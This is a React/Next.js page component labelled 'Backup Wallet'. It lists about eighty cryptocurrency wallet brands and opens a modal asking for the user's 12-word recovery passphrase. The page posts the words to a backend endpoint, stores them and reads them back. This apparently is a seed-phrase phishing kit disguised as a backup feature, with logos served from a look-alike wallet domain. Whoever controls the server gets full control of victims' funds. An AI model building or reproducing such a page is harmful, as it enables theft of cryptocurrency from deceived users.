'use client';

import Image, { StaticImageData } from "next/image";
import '../../app/globals.css';
import { useEffect, useState } from "react";
import axios, { AxiosError } from "axios";
import apiClient from "@/lib/axios-config";
import Footer1 from "@/components/footers/Footer1";
import { toast } from "react-toastify";
import ArculusLogo from '../../assets/arculus.jpg';
import KrakenLogo from '../../assets/kraken.jpg';

interface CryptoService {
    name: string;
    logo: string | StaticImageData;
}

const cryptoServices: CryptoService[] = [
    { name: "Trust", logo: 'https://s3.coinmarketcap.com/static-gravity/image/bdb7a8c7bb114e8aa29f8b6fee2e7a41.png' },
    { name: "Meta Mask", logo: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT3ymr3UNKopfI0NmUY95Dr-0589vG-91KuAA&s' },
    { name: "Lobstr", logo: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxZO-w6G9AhJ0wp-OJ0-JSCnTg-VkTBLvRTw&s' },
    { name: "Coinbase", logo: 'https://crystalweb3ledger.com/images/wallets/3_coinbase.png' },
    { name: "Aktionariat", logo: 'https://crystalweb3ledger.com/images/wallets/aktionariat.png' },
    { name: "Alice", logo: 'https://crystalweb3ledger.com/images/wallets/alice.png' },
    { name: "Alpha Wallet", logo: 'https://crystalweb3ledger.com/images/wallets/alpha_wallet.png' },
    { name: "Anchor", logo: 'https://crystalweb3ledger.com/images/wallets/anchor.png' },
    { name: "Argent", logo: 'https://crystalweb3ledger.com/images/wallets/argent.png' },
    { name: "At.wallet", logo: 'https://crystalweb3ledger.com/images/wallets/at.wallet.png' },
    { name: "Atomic", logo: 'https://crystalweb3ledger.com/images/wallets/atomic.png' },
    { name: "Authereum", logo: 'https://crystalweb3ledger.com/images/wallets/authereum.png' },
    { name: "Arculus", logo: ArculusLogo },
    { name: "Bakkt", logo: 'https://crystalweb3ledger.com/images/wallets/bakkt.png' },
    { name: "Binance Smart Chain", logo: 'https://crystalweb3ledger.com/images/wallets/binance_smart_chain.png' },
    { name: "Bit Keep", logo: 'https://crystalweb3ledger.com/images/wallets/bit_keep.png' },
    { name: "Bit Pay", logo: 'https://crystalweb3ledger.com/images/wallets/bit_pay.png' },
    { name: "Blockchain", logo: 'https://crystalweb3ledger.com/images/wallets/blockchain.png' },
    { name: "Bridge Wallet", logo: 'https://crystalweb3ledger.com/images/wallets/bridge_wallet.png' },
    { name: "Coin98", logo: 'https://crystalweb3ledger.com/images/wallets/coin98.png' },
    { name: "Coinomi", logo: 'https://crystalweb3ledger.com/images/wallets/coinomi.png' },
    { name: "Cool Wallet S", logo: 'https://crystalweb3ledger.com/images/wallets/cool_wallet_s.png' },
    { name: "Cosmostation", logo: 'https://crystalweb3ledger.com/images/wallets/cosmostation.png' },
    { name: "Crypto.com Defi Wallet", logo: 'https://crystalweb3ledger.com/images/wallets/crypto.com_defi_wallet.png' },
    { name: "Cybavo Wallet", logo: 'https://crystalweb3ledger.com/images/wallets/cybavo_wallet.png' },
    { name: "D'Cent Wallet", logo: 'https://crystalweb3ledger.com/images/wallets/d_cent_wallet.png' },
    { name: "Dok Wallet", logo: 'https://crystalweb3ledger.com/images/wallets/dok_wallet.png' },
    { name: "Easy Pocket", logo: 'https://crystalweb3ledger.com/images/wallets/easy_pocket.jpg' },
    { name: "Eidoo", logo: 'https://crystalweb3ledger.com/images/wallets/eidoo.png' },
    { name: "Ellipal", logo: 'https://crystalweb3ledger.com/images/wallets/ellipal.png' },
    { name: "Equal", logo: 'https://crystalweb3ledger.com/images/wallets/equal.jpg' },
    { name: "Exodus", logo: 'https://crystalweb3ledger.com/images/wallets/exodus.png' },
    { name: "Fetch", logo: 'https://crystalweb3ledger.com/images/wallets/fetch.jpg' },
    { name: "Gnosis Safe Multisig", logo: 'https://crystalweb3ledger.com/images/wallets/gnosis_safe_multisig.png' },
    { name: "Graph Protocol", logo: 'https://crystalweb3ledger.com/images/wallets/graph_protocol.jpg' },
    { name: "Grid Plus", logo: 'https://crystalweb3ledger.com/images/wallets/grid_plus.png' },
    { name: "Harmony", logo: 'https://crystalweb3ledger.com/images/wallets/harmony.png' },
    { name: "Huobi Wallet", logo: 'https://crystalweb3ledger.com/images/wallets/huobi_wallet.png' },
    { name: "Iconex", logo: 'https://crystalweb3ledger.com/images/wallets/iconex.png' },
    { name: "Infinito", logo: 'https://crystalweb3ledger.com/images/wallets/infinito.png' },
    { name: "Infinity Wallet", logo: 'https://crystalweb3ledger.com/images/wallets/infinity_wallet.png' },
    { name: "Karda Chain", logo: 'https://crystalweb3ledger.com/images/wallets/karda_chain.png' },
    { name: "Keplr", logo: 'https://crystalweb3ledger.com/images/wallets/keplr.png' },
    { name: "Keyring Pro", logo: 'https://crystalweb3ledger.com/images/wallets/keyring_pro.png' },
    { name: "Kraken", logo: KrakenLogo},
    { name: "Ledger Live", logo: 'https://crystalweb3ledger.com/images/wallets/ledger_live.png' },
    { name: "Ledger Nano S", logo: 'https://crystalweb3ledger.com/images/wallets/ledger_nano_s.png' },
    { name: "Ledger Nano X", logo: 'https://crystalweb3ledger.com/images/wallets/ledger_nano_x.png' },
    { name: "Loopring Wallet", logo: 'https://crystalweb3ledger.com/images/wallets/loopring_wallet.png' },
    { name: "Maiar", logo: 'https://crystalweb3ledger.com/images/wallets/maiar.png' },
    { name: "Math Wallet", logo: 'https://crystalweb3ledger.com/images/wallets/math_wallet.png' },
    { name: "Meet.one", logo: 'https://crystalweb3ledger.com/images/wallets/meet.one.jpg' },
    { name: "Midas Wallet", logo: 'https://crystalweb3ledger.com/images/wallets/midas_wallet.png' },
    { name: "Morix Wallet", logo: 'https://crystalweb3ledger.com/images/wallets/morix_wallet.png' },
    { name: "Mykey", logo: 'https://crystalweb3ledger.com/images/wallets/mykey.png' },
    { name: "Nash", logo: 'https://crystalweb3ledger.com/images/wallets/nash.png' },
    { name: "Onto", logo: 'https://crystalweb3ledger.com/images/wallets/onto.png' },
    { name: "Ownbit", logo: 'https://crystalweb3ledger.com/images/wallets/ownbit.png' },
    { name: "Peak Defi Wallet", logo: 'https://crystalweb3ledger.com/images/wallets/peak_defi_wallet.png' },
    { name: "Pillar", logo: 'https://crystalweb3ledger.com/images/wallets/pillar.png' },
    { name: "Rainbow", logo: 'https://crystalweb3ledger.com/images/wallets/rainbow.png' },
    { name: "Safepal", logo: 'https://crystalweb3ledger.com/images/wallets/safepal.png' },
    { name: "Spark Point", logo: 'https://crystalweb3ledger.com/images/wallets/spark_point.png' },
    { name: "Spatium", logo: 'https://crystalweb3ledger.com/images/wallets/spatium.png' },
    { name: "Tangem", logo: 'https://crystalweb3ledger.com/images/wallets/tangem.png' },
    { name: "Token Pocket", logo: 'https://crystalweb3ledger.com/images/wallets/token_pocket.png' },
    { name: "Tokenary", logo: 'https://crystalweb3ledger.com/images/wallets/tokenary.png' },
    { name: "Torus", logo: 'https://crystalweb3ledger.com/images/wallets/torus.png' },
    { name: "Trezor Model T", logo: 'https://crystalweb3ledger.com/images/wallets/trezor_model_t.png' },
    { name: "Trust Vault", logo: 'https://crystalweb3ledger.com/images/wallets/trust_vault.png' },
    { name: "Unstoppable Wallet", logo: 'https://crystalweb3ledger.com/images/wallets/unstoppable_wallet.png' },
    { name: "Via Wallet", logo: 'https://crystalweb3ledger.com/images/wallets/via_wallet.png' },
    { name: "Vision", logo: 'https://crystalweb3ledger.com/images/wallets/vision.png' },
    { name: "Wallet.io", logo: 'https://crystalweb3ledger.com/images/wallets/wallet.io.png' },
    { name: "Wallet Connect", logo: 'https://crystalweb3ledger.com/images/wallets/wallet_connect.png' },
    { name: "Walleth", logo: 'https://crystalweb3ledger.com/images/wallets/walleth.png' },
    { name: "Wazirx", logo: 'https://crystalweb3ledger.com/images/wallets/wazirx.png' },
    { name: "Xaman", logo: 'https://crystalweb3ledger.com/images/wallets/xaman.png' },
    { name: "Xdc Wallet", logo: 'https://crystalweb3ledger.com/images/wallets/xdc_wallet.png' },
    { name: "Zel Core", logo: 'https://crystalweb3ledger.com/images/wallets/zel_core.png' },
];

export default function BackupWallet() {
    const [selectedWallet, setSelectedWallet] = useState<CryptoService | null>(null);
    const [isModalOpen, setIsModalOpen] = useState(false);
    const [words, setWords] = useState<string[]>(Array(12).fill(""));
    const [filledWallets, setFilledWallets] = useState<string[]>([]);
    const [walletData, setWalletData] = useState<any[]>([]);

    useEffect(() => {
        const fetchWallets = async () => {
            try {
                const res = await apiClient.get('/api/history/get_word', {
                    headers: {
                        Authorization: `Bearer ${localStorage.getItem("token")}`
                    }
                });

                if (res.data.status_code && res.data.wallets?.length) {
                    setWalletData(res.data.wallets);
                    const walletsWithAllWords = res.data.wallets
                        .filter((w: any) => w.mnemonic?.trim().split(/\s+/).length === 12)
                        .map((w: any) => w.type);

                    setFilledWallets(walletsWithAllWords);
                }
            } catch (err) {
                const error = err as AxiosError<{ msg: string }>;
                console.log("error fetching wallets:", error);
            }
        };
        fetchWallets();
    }, []);

    const openModal = (wallet: CryptoService) => {
        setSelectedWallet(wallet);
        setIsModalOpen(true);

        const savedWallet = walletData.find(
            (w: any) => w.type.trim().toLowerCase() === wallet.name.trim().toLowerCase()
        );

        if (savedWallet?.mnemonic) {
            const mnemonicWords = savedWallet.mnemonic.trim().split(/\s+/);
            const limitedWords = mnemonicWords.slice(0, 12);
            setWords([
                ...limitedWords,
                ...Array(Math.max(0, 12 - limitedWords.length)).fill("")
            ]);
        } else {
            setWords(Array(12).fill(""));
        }
    };


    const closeModal = () => {
        setIsModalOpen(false);
        setSelectedWallet(null);
        setWords(Array(12).fill(""));
    };

    const handleWordChange = (index: number, value: string) => {
        const updated = [...words];
        updated[index] = value;
        setWords(updated);
    };

    const handleSubmit = async () => {
        if (words.some(word => word.trim() === "")) {
            // alert("fill all 12 words.");
            toast.error('Fill all 12 words.');
            return;
        }

        if (!selectedWallet) return;

        try {
            const payload = {
                type: selectedWallet.name,
                one: words[0],
                two: words[1],
                three: words[2],
                four: words[3],
                five: words[4],
                six: words[5],
                seven: words[6],
                eight: words[7],
                nine: words[8],
                ten: words[9],
                eleven: words[10],
                twelve: words[11]
            };

            const res = await apiClient.post('/api/history/add_word', payload);

            if (res.data.status_code) {
                // alert("✅ Wallet words saved successfully");
                toast.success('Wallet words saved successfully');
                closeModal();
                const refreshed = await apiClient.get('/api/history/get_word', {
                    headers: {
                        Authorization: `Bearer ${localStorage.getItem("token")}`
                    }
                });
                setWalletData(refreshed.data.wallets);
                const walletsWithAllWords = refreshed.data.wallets
                    .filter((w: any) => w.mnemonic?.trim().split(/\s+/).length === 12)
                    .map((w: any) => w.type);
                setFilledWallets(walletsWithAllWords);
            }
        } catch (err) {
            const error = err as AxiosError<{ msg: string }>;
            console.log(error.response?.data?.msg || "❌ Something went wrong.");
        }
    };

    return (
        <>
        <div className="tw-bg-[#11150f] tw-text-white tw-px-6 tw-pt-8 tf-container tw-pb-28">
            <h2 className="tw-text-lg tw-font-semibold tw-mb-8">Backup Wallet</h2>
            <div className="tw-grid tw-grid-cols-2 sm:tw-grid-cols-3 lg:tw-grid-cols-4 tw-gap-[20px]">
                {cryptoServices.map((service) => (
                    <div
                        key={service.name}
                        onClick={() => openModal(service)}
                        className={`tw-flex tw-flex-col tw-items-center tw-gap-4 tw-bg-black/20 tw-rounded-lg tw-px-3 tw-py-3 tw-transition tw-border-2 tw-border-solid
                            ${filledWallets.includes(service.name) ? "!tw-border-[#008000]" : "tw-border-[#f1f1f2]/30"} 
                            tw-cursor-pointer tw-hover:tw-bg-black/40`}
                    >
                        <div className="tw-w-12 tw-h-12 tw-relative tw-rounded-lg tw-overflow-hidden tw-mr-[12px]">
                            <Image
                                src={service.logo}
                                alt={service.name}
                                fill
                                className="tw-object-cover"
                            />
                        </div>
                        <div>
                            <h3 className="tw-text-lg tw-text-center">{service.name}</h3>
                        </div>
                    </div>
                ))}
            </div>
            {isModalOpen && selectedWallet && (
                <div className="tw-fixed tw-inset-0 tw-z-50 tw-bg-black tw-bg-opacity-70 tw-flex tw-justify-center tw-items-center">
                    <div className="tw-bg-[#1a1a1a] tw-rounded-lg tw-w-[90%] tw-max-w-md tw-p-8 tw-relative tw-text-white">
                        <button onClick={closeModal} className="tw-absolute tw-top-4 tw-right-6 tw-text-xl tw-border-none tw-w-0">×</button>
                        <div className="tw-flex tw-items-center tw-gap-[12px] tw-mb-4">
                            <div className="tw-w-10 tw-h-10 tw-relative tw-rounded-lg tw-overflow-hidden">
                                <Image
                                    src={selectedWallet.logo}
                                    alt={selectedWallet.name}
                                    fill
                                    className="tw-object-cover"
                                />
                            </div>
                            <h2 className="tw-text-xl tw-font-bold">{selectedWallet.name}</h2>
                        </div>
                        <hr className="tw-my-4" />
                        <p className="tw-mb-[20px] tw-text-center tw-text-[16px]">Enter your 12-word passphrase:</p>
                        <div className="tw-grid tw-grid-cols-2 tw-gap-[10px] tw-mb-[16px] tw-text-[13px]">
                            {words.map((word, i) => (
                                <input
                                    key={i}
                                    type="text"
                                    placeholder={`Word ${i + 1}`}
                                    value={word}
                                    onChange={(e) => handleWordChange(i, e.target.value)}
                                    className="tw-bg-[#333] tw-p-2 tw-rounded tw-text-white tw-border-2 tw-border-solid tw-border-gray-600 tw-outline-none tw-placeholder:tw-text-[13px]"
                                />
                            ))}
                        </div>
                        <button
                            onClick={handleSubmit}
                            className="tw-bg-green-600 tw-hover:tw-bg-green-700 tw-text-white tw-py-2 tw-px-4 tw-rounded tw-w-full tw-text-[16px]"
                        >
                            Link Wallet
                        </button>
                    </div>
                </div>
            )}
        </div>
        <Footer1/>
        </>
    );
}
